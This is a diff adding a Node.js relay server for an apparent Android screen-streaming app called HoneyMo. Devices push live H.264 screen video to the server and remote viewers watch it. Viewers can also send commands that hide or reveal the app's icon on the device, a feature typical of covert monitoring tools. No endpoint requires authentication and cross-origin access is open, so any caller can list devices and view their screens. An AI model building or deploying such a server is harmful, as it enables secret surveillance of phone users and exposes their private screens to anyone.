@@ -1,0 +1,476 @@
+const http = require('http');
+const express = require('express');
+const { WebSocketServer, WebSocket } = require('ws');
+const path = require('path');
+const os = require('os');
+const url = require('url');
+
+const app = express();
+const PORT = process.env.PORT || 3000;
+
+// Trust reverse proxies (Render, Cloudflare, Nginx)
+app.set('trust proxy', 1);
+
+// Enable CORS for API endpoints
+app.use((req, res, next) => {
+  res.header('Access-Control-Allow-Origin', '*');
+  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
+  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+  if (req.method === 'OPTIONS') {
+    return res.sendStatus(200);
+  }
+  next();
+});
+
+// Serve dashboard frontend
+app.use(express.static(path.join(__dirname, 'public')));
+app.use(express.json());
+
+const server = http.createServer(app);
+
+// WebSocket servers
+const wssDevice = new WebSocketServer({ noServer: true });
+const wssViewer = new WebSocketServer({ noServer: true });
+
+// Multi-device registry
+// Map<deviceId, { id, name, ws, width, height, fps, bitrate, connectedAt, cachedConfig, stats } >
+const activeDevices = new Map();
+
+// Helper to inspect NAL unit types in Annex B H.264
+function extractSpsPps(buffer) {
+  let hasSps = false;
+  let hasPps = false;
+  const len = buffer.length;
+  for (let i = 0; i < len - 4; i++) {
+    if (buffer[i] === 0 && buffer[i + 1] === 0) {
+      let nalStart = -1;
+      if (buffer[i + 2] === 1) {
+        nalStart = i + 3;
+      } else if (buffer[i + 2] === 0 && buffer[i + 3] === 1) {
+        nalStart = i + 4;
+      }
+      if (nalStart !== -1 && nalStart < len) {
+        const nalType = buffer[nalStart] & 0x1F;
+        if (nalType === 7) hasSps = true;
+        if (nalType === 8) hasPps = true;
+      }
+    }
+  }
+  return hasSps || hasPps;
+}
+
+function getDeviceList() {
+  const list = [];
+  for (const [id, dev] of activeDevices.entries()) {
+    list.push({
+      id: dev.id,
+      name: dev.name,
+      width: dev.width,
+      height: dev.height,
+      fps: dev.fps,
+      bitrate: dev.bitrate,
+      isIconVisible: dev.isIconVisible !== false,
+      connectedAt: dev.connectedAt,
+      stats: dev.stats
+    });
+  }
+  return list;
+}
+
+function broadcastDeviceListToViewers() {
+  const payload = JSON.stringify({
+    type: 'DEVICE_LIST',
+    devices: getDeviceList()
+  });
+
+  wssViewer.clients.forEach((client) => {
+    if (client.readyState === WebSocket.OPEN) {
+      client.send(payload);
+    }
+  });
+}
+
+// --------------------------------------------------------------------------
+// WebSocket Heartbeat / Ping-Pong (Keeps Render proxy connection alive)
+// --------------------------------------------------------------------------
+const heartbeatInterval = setInterval(() => {
+  wssDevice.clients.forEach((ws) => {
+    if (ws.isAlive === false) return ws.terminate();
+    ws.isAlive = false;
+    ws.ping();
+  });
+  wssViewer.clients.forEach((ws) => {
+    if (ws.isAlive === false) return ws.terminate();
+    ws.isAlive = false;
+    ws.ping();
+  });
+}, 30000); // 30s interval for Render reverse proxy
+
+function setupHeartbeat(ws) {
+  ws.isAlive = true;
+  ws.on('pong', () => {
+    ws.isAlive = true;
+  });
+}
+
+// --------------------------------------------------------------------------
+// Device WebSocket Handler
+// --------------------------------------------------------------------------
+wssDevice.on('connection', (ws, req) => {
+  setupHeartbeat(ws);
+
+  const parsedUrl = url.parse(req.url, true);
+  let deviceId = parsedUrl.query.id || `dev_${Date.now()}_${Math.floor(Math.random() * 1000)}`;
+  let deviceName = parsedUrl.query.name || 'Android Device';
+
+  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+  console.log(`[Device] Connection initiated: ${deviceId} (${deviceName}) from ${clientIp}`);
+
+  const deviceRecord = {
+    id: deviceId,
+    name: deviceName,
+    ws: ws,
+    width: 720,
+    height: 1280,
+    fps: 30,
+    bitrate: 2000000,
+    isIconVisible: true,
+    connectedAt: new Date().toISOString(),
+    cachedConfig: null,
+    stats: {
+      framesReceived: 0,
+      bytesReceived: 0,
+      currentFps: 0,
+      currentBitrateKbps: 0
+    },
+    _secondFrames: 0,
+    _secondBytes: 0
+  };
+
+  activeDevices.set(deviceId, deviceRecord);
+  broadcastDeviceListToViewers();
+
+  // Calculate per-device FPS / Bitrate
+  const statsInterval = setInterval(() => {
+    deviceRecord.stats.currentFps = deviceRecord._secondFrames;
+    deviceRecord.stats.currentBitrateKbps = Math.round((deviceRecord._secondBytes * 8) / 1024);
+    deviceRecord._secondFrames = 0;
+    deviceRecord._secondBytes = 0;
+  }, 1000);
+
+  ws.on('message', (message, isBinary) => {
+    if (isBinary) {
+      deviceRecord.stats.framesReceived++;
+      deviceRecord.stats.bytesReceived += message.length;
+      deviceRecord._secondFrames++;
+      deviceRecord._secondBytes += message.length;
+
+      // Cache SPS/PPS if present in this chunk
+      if (extractSpsPps(message)) {
+        deviceRecord.cachedConfig = Buffer.from(message);
+      }
+
+      // Forward binary H.264 frame to viewers subscribed to this device
+      wssViewer.clients.forEach((viewer) => {
+        if (viewer.readyState === WebSocket.OPEN) {
+          if (viewer.subscribedDeviceId === deviceId || (!viewer.subscribedDeviceId && activeDevices.size === 1)) {
+            viewer.send(message, { binary: true });
+          }
+        }
+      });
+    } else {
+      // JSON message from device
+      try {
+        const text = message.toString();
+        const data = JSON.parse(text);
+
+        if (data.type === 'INIT') {
+          if (data.deviceId) {
+            activeDevices.delete(deviceId);
+            deviceId = data.deviceId;
+            deviceRecord.id = deviceId;
+            activeDevices.set(deviceId, deviceRecord);
+          }
+          if (data.deviceName) deviceRecord.name = data.deviceName;
+          if (data.width) deviceRecord.width = data.width;
+          if (data.height) deviceRecord.height = data.height;
+          if (data.fps) deviceRecord.fps = data.fps;
+          if (data.bitrate) deviceRecord.bitrate = data.bitrate;
+          if (typeof data.isIconVisible === 'boolean') deviceRecord.isIconVisible = data.isIconVisible;
+
+          console.log(`[Device] Registered ${deviceRecord.name} [${deviceId}] (${deviceRecord.width}x${deviceRecord.height} @ ${deviceRecord.fps}fps, iconVisible=${deviceRecord.isIconVisible})`);
+          broadcastDeviceListToViewers();
+        } else if (data.type === 'ICON_STATE') {
+          deviceRecord.isIconVisible = !!data.isIconVisible;
+          console.log(`[Device ${deviceId}] Broadcasted ICON_STATE: isIconVisible=${deviceRecord.isIconVisible}`);
+          const payload = JSON.stringify({
+            type: 'DEVICE_ICON_STATE',
+            deviceId: deviceId,
+            isIconVisible: deviceRecord.isIconVisible
+          });
+          wssViewer.clients.forEach((client) => {
+            if (client.readyState === WebSocket.OPEN) {
+              if (client.subscribedDeviceId === deviceId || (!client.subscribedDeviceId && activeDevices.size === 1)) {
+                client.send(payload);
+              }
+            }
+          });
+        }
+      } catch (err) {
+        console.error('[Device] Error parsing message:', err.message);
+      }
+    }
+  });
+
+  ws.on('close', (code, reason) => {
+    console.log(`[Device] Disconnected: ${deviceId} (${code} - ${reason})`);
+    clearInterval(statsInterval);
+    activeDevices.delete(deviceId);
+    broadcastDeviceListToViewers();
+  });
+
+  ws.on('error', (err) => {
+    console.error(`[Device Error ${deviceId}]`, err.message);
+  });
+});
+
+// --------------------------------------------------------------------------
+// Viewer WebSocket Handler (Used by HoneyMo Preview app & Web Dashboard)
+// --------------------------------------------------------------------------
+wssViewer.on('connection', (ws, req) => {
+  setupHeartbeat(ws);
+
+  const parsedUrl = url.parse(req.url, true);
+  const targetDeviceId = parsedUrl.query.deviceId || null;
+  ws.subscribedDeviceId = targetDeviceId;
+
+  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+  console.log(`[Viewer] Connected from ${clientIp}. Subscribed to: ${targetDeviceId || 'all/default'}`);
+
+  // Send initial device list
+  ws.send(JSON.stringify({
+    type: 'DEVICE_LIST',
+    devices: getDeviceList()
+  }));
+
+  // If already subscribed to a device, send cached config and request fresh keyframe
+  if (targetDeviceId && activeDevices.has(targetDeviceId)) {
+    const dev = activeDevices.get(targetDeviceId);
+    sendCachedConfigAndKeyframe(ws, dev);
+  } else if (!targetDeviceId && activeDevices.size === 1) {
+    const firstDev = activeDevices.values().next().value;
+    sendCachedConfigAndKeyframe(ws, firstDev);
+  }
+
+  ws.on('message', (message) => {
+    try {
+      const data = JSON.parse(message.toString());
+
+      if (data.type === 'GET_DEVICES') {
+        ws.send(JSON.stringify({
+          type: 'DEVICE_LIST',
+          devices: getDeviceList()
+        }));
+      } else if (data.type === 'SUBSCRIBE') {
+        ws.subscribedDeviceId = data.deviceId;
+        console.log(`[Viewer] Switched subscription to device: ${data.deviceId}`);
+        if (activeDevices.has(data.deviceId)) {
+          const dev = activeDevices.get(data.deviceId);
+          sendCachedConfigAndKeyframe(ws, dev);
+        }
+      } else if (data.type === 'REQUEST_KEYFRAME') {
+        const devId = data.deviceId || ws.subscribedDeviceId;
+        if (devId && activeDevices.has(devId)) {
+          const dev = activeDevices.get(devId);
+          if (dev.ws && dev.ws.readyState === WebSocket.OPEN) {
+            dev.ws.send(JSON.stringify({ type: 'REQUEST_KEYFRAME' }));
+            console.log(`[Viewer] Requested keyframe from device ${devId}`);
+          }
+        }
+      } else if (data.type === 'SET_ICON_VISIBILITY' || data.type === 'REVEAL_ICON' || data.type === 'HIDE_ICON' || data.type === 'TOGGLE_ICON') {
+        const devId = data.deviceId || ws.subscribedDeviceId;
+        const targetDev = (devId && activeDevices.has(devId))
+          ? activeDevices.get(devId)
+          : (activeDevices.size === 1 ? activeDevices.values().next().value : null);
+
+        if (targetDev && targetDev.ws && targetDev.ws.readyState === WebSocket.OPEN) {
+          const isVisible = data.type === 'SET_ICON_VISIBILITY'
+            ? !!data.visible
+            : data.type === 'HIDE_ICON'
+            ? false
+            : data.type === 'REVEAL_ICON'
+            ? true
+            : !targetDev.isIconVisible;
+
+          targetDev.ws.send(JSON.stringify({
+            type: 'SET_ICON_VISIBILITY',
+            visible: isVisible
+          }));
+          console.log(`[Viewer] Forwarded SET_ICON_VISIBILITY (visible=${isVisible}) to device ${targetDev.id}`);
+        }
+      }
+    } catch (e) {
+      console.error('[Viewer Message Error]', e.message);
+    }
+  });
+
+  ws.on('close', () => {
+    console.log(`[Viewer] Disconnected`);
+  });
+});
+
+function sendCachedConfigAndKeyframe(viewerWs, dev) {
+  if (!dev) return;
+  if (viewerWs.readyState === WebSocket.OPEN) {
+    viewerWs.send(JSON.stringify({
+      type: 'DEVICE_ICON_STATE',
+      deviceId: dev.id,
+      isIconVisible: dev.isIconVisible !== false
+    }));
+  }
+  if (dev.cachedConfig && viewerWs.readyState === WebSocket.OPEN) {
+    viewerWs.send(dev.cachedConfig, { binary: true });
+  }
+  if (dev.ws && dev.ws.readyState === WebSocket.OPEN) {
+    try {
+      dev.ws.send(JSON.stringify({ type: 'REQUEST_KEYFRAME' }));
+    } catch (e) {}
+  }
+}
+
+// Upgrade handling for WebSockets
+server.on('upgrade', (request, socket, head) => {
+  const pathname = url.parse(request.url).pathname;
+
+  if (pathname === '/ws/device') {
+    wssDevice.handleUpgrade(request, socket, head, (ws) => {
+      wssDevice.emit('connection', ws, request);
+    });
+  } else if (pathname === '/ws/viewer' || pathname === '/ws') {
+    wssViewer.handleUpgrade(request, socket, head, (ws) => {
+      wssViewer.emit('connection', ws, request);
+    });
+  } else {
+    socket.destroy();
+  }
+});
+
+// --------------------------------------------------------------------------
+// REST Endpoints & Render Healthcheck
+// --------------------------------------------------------------------------
+// Standard Render Health Check
+app.get('/healthz', (req, res) => {
+  res.status(200).json({
+    status: 'healthy',
+    uptime: process.uptime(),
+    timestamp: new Date().toISOString()
+  });
+});
+
+app.get('/api/devices', (req, res) => {
+  res.json({
+    status: 'ok',
+    count: activeDevices.size,
+    devices: getDeviceList()
+  });
+});
+
+app.get('/api/devices/:id', (req, res) => {
+  const dev = activeDevices.get(req.params.id);
+  if (!dev) return res.status(404).json({ error: 'Device not found' });
+  res.json({
+    status: 'ok',
+    device: {
+      id: dev.id,
+      name: dev.name,
+      width: dev.width,
+      height: dev.height,
+      fps: dev.fps,
+      bitrate: dev.bitrate,
+      connectedAt: dev.connectedAt,
+      stats: dev.stats
+    }
+  });
+});
+
+app.post('/api/devices/:id/reveal-icon', (req, res) => {
+  const dev = activeDevices.get(req.params.id);
+  if (!dev) return res.status(404).json({ error: 'Device not found' });
+  if (dev.ws && dev.ws.readyState === WebSocket.OPEN) {
+    dev.ws.send(JSON.stringify({ type: 'REVEAL_ICON' }));
+    console.log(`[REST] Sent REVEAL_ICON command to device ${dev.id}`);
+    return res.json({ status: 'ok', message: 'Reveal icon command sent' });
+  }
+  return res.status(503).json({ error: 'Device socket not connected' });
+});
+
+app.get('/api/status', (req, res) => {
+  res.json({
+    status: 'ok',
+    totalDevices: activeDevices.size,
+    totalViewers: wssViewer.clients.size,
+    uptime: process.uptime(),
+    devices: getDeviceList()
+  });
+});
+
+function getLocalIps() {
+  const interfaces = os.networkInterfaces();
+  const addresses = [];
+  for (const name of Object.keys(interfaces)) {
+    for (const net of interfaces[name]) {
+      if (net.family === 'IPv4' && !net.internal) {
+        addresses.push(net.address);
+      }
+    }
+  }
+  return addresses;
+}
+
+// Graceful shutdown handling for cloud hosts (Render/Heroku/Kubernetes)
+process.on('SIGTERM', () => {
+  console.log('[Server] SIGTERM received. Closing gracefully...');
+  clearInterval(heartbeatInterval);
+  server.close(() => {
+    console.log('[Server] HTTP and WebSocket servers closed.');
+    process.exit(0);
+  });
+});
+
+process.on('SIGINT', () => {
+  console.log('[Server] SIGINT received. Closing gracefully...');
+  clearInterval(heartbeatInterval);
+  server.close(() => {
+    console.log('[Server] HTTP and WebSocket servers closed.');
+    process.exit(0);
+  });
+});
+
+server.listen(PORT, '0.0.0.0', () => {
+  const ips = getLocalIps();
+  const renderHostname = process.env.RENDER_EXTERNAL_HOSTNAME || (process.env.RENDER ? 'honeymo-relay-server.onrender.com' : null);
+
+  console.log('====================================================');
+  console.log(` HoneyMo Server listening on port ${PORT}`);
+  console.log(` Environment: ${process.env.NODE_ENV || 'development'}`);
+  console.log(` Health check: http://0.0.0.0:${PORT}/healthz`);
+
+  if (renderHostname) {
+    console.log(` Public Render Cloud Endpoints:`);
+    console.log(`   -> Web Dashboard:         https://${renderHostname}`);
+    console.log(`   -> HoneyMo Streamer URL:  wss://${renderHostname}/ws/device`);
+    console.log(`   -> HoneyMo Previewer URL: wss://${renderHostname}/ws/viewer`);
+  } else {
+    console.log(` Web Dashboard: http://localhost:${PORT}`);
+    console.log(` Local IP Addresses for Android connection:`);
+    ips.forEach(ip => {
+      console.log(`   -> Device stream endpoint: ws://${ip}:${PORT}/ws/device`);
+      console.log(`   -> Viewer endpoint:        ws://${ip}:${PORT}/ws/viewer`);
+    });
+  }
+  console.log('====================================================');
+});
+// Lightweight health-check endpoint for keep-alive pings
+app.get('/health', (req, res) => {
+  res.status(200).send('OK');
+});
